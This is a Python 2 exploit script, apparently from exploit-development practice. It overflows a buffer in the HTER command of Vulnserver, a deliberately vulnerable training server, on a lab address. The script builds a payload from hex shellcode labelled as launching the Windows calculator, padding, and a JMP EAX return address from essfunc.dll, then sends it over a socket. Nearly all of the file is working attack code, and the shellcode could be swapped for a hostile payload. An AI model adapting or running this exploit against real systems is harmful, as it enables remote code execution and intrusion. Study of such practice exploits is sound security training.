#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import struct

__author__ = "f47h3r - Chase Schultz"

if __name__ == '__main__':
    usage = __doc__
    author = __author__
    version = "0.01"
    
    
    ## Windows Exec Calc Shellcode
    buf =  ""
    buf += "dad2b8c827805bd97424f45b2b"
    buf += "c9b13183c3043143140343dcc5"
    buf += "75a7348b7658c4ecffbdf52c9b"
    buf += "b6a59cef9b4956bd0fda1a6a3f"
    buf += "6b904c0e6c89ad11eed0e1f1cf"
    buf += "1af4f00846f5a1c10ca8556658"
    buf += "71dd344cf1028c6fd0948729f2"
    buf += "174442bb0f896f75bb791b846d"
    buf += "b0e42b507d173594b9c840ecba"
    buf += "75532bc1a1d6a86121401590e6"
    buf += "17de9e4353b88252b0b2bedf37"
    buf += "15379b13b11c7f3de0f82e42f2"
    buf += "a38fe67849db9a22071a285965"
    buf += "1c3262d97503e9b6029c38f3fd"
    buf += "d6615596bef3e4fb402e2a02c3"
    buf += "dbd2f1dba9d7be5b41a5af0965"
    buf += "1acf1b06fd43c7e798e362f8"

    shellcode = buf

    ## JMP EAX - In fuzzing/results/vulnserver/bin/essfunc.dll
    eip = "b1115062"

    print "\n\n--Vulnserver CRASHER--\n\n"

    print "Length of Shellcode:\t%d" % len(shellcode)

    print "Length of EIP:\t%d" % len(eip)

    #payload = "HTER "+"A"*4000

    ## Working Payload
    #payload = "HTER "+ "1BBBBBBBB" +"A"*(2041-9)+eip+"A"*951
    
    #Working Crash
    #payload = "HTER "+ "1"+ shellcode+"A"*(2041-9)+"2"*8+"A"*951

    payload = "HTER "+ "1"+ shellcode +"A"*((2041-1)-len(shellcode))+eip+"A"*951

    print "--Payload--\n\n%s\n\n" % payload

    print "Payload Length:\t%d" % len(payload)

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('172.16.1.129', 9999))
    
    ## Recieve Banner
    banner = client_socket.recv(512)
    print banner

    ## Send Payload
    client_socket.send(payload)


    #command = raw_input()
    #client_socket.send(command)
    response = client_socket.recv(512)
    print response
    client_socket.close()
